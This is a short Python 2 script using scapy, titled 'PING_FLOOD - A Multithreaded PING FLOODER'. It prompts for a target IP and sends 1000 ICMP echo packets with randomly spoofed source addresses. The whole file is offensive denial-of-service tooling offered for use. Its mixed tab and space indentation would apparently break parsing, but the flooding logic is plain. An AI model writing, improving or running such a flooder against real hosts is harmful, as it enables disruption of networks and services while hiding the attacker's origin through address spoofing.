from scapy.all import *
import socket,sys,threading,random
print '###########################################'
print '#PING_FLOOD - A Multithreaded PING FLOODER#'
print '#\t\tAuthor: VinhNgo \t  #'
print '###########################################'
class PING(threading.Thread):
        def __init__(self,target):
                threading.Thread.__init__(self)
		self.target = target

	def addr_rand(self):
		addr = "{}.{}.{}.{}".format(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
		return addr 
       
	def run(self):
		ip = IP(src=self.addr_rand(),dst=self.target)
		send(ip/ICMP(),count=1000)
		print'Ping Flood Complete!'

def PINGFlood():
	target = raw_input("Target IP: ")
	print 'Flooding {} with PING packets.'.format(target)
	pingFlood = PING(target)	
	pingFlood.start()

PINGFlood()